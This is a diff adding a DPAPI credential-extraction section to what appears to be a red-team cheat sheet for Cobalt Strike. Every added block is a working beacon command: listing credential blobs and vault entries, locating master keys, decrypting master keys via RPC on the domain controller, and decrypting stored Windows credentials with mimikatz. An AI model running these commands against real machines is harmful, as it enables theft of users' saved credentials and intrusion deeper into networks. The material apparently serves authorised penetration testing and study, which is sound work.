@@ -93,6 +93,52 @@ beacon> rportfwd_local 8080 127.0.0.1 80
 
 
 
+## Credentials
+
+
+
+### DPAPI
+
+List credential blobs:
+
+```
+beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
+```
+
+List vault credentials:
+
+```
+beacon> run vaultcmd /listcreds:"Windows Credentials" /all
+beacon> mimikatz vault::list
+```
+
+Check which master keys correspond to credential blobs (look for **guidMasterKey** field with GUID):
+
+```
+beacon> mimikatz dpapi::cred /in:C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\<BLOB>
+```
+
+The master key is stored here:
+
+```
+beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\<SID>
+```
+
+Decrypt the master key via RPC on the Domain Controller and show it:
+
+```
+beacon> mimikatz dpapi::masterkey /in:C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\<SID> /rpc
+```
+
+Decrypt the blob with decrypted master key:
+
+```
+beacon> mimikatz dpapi::cred /in:C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\<BLOB> /masterkey:<MASTERKEY>
+```
+
+
+
+
 ## BloodHound
 
 * [https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146](https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146)
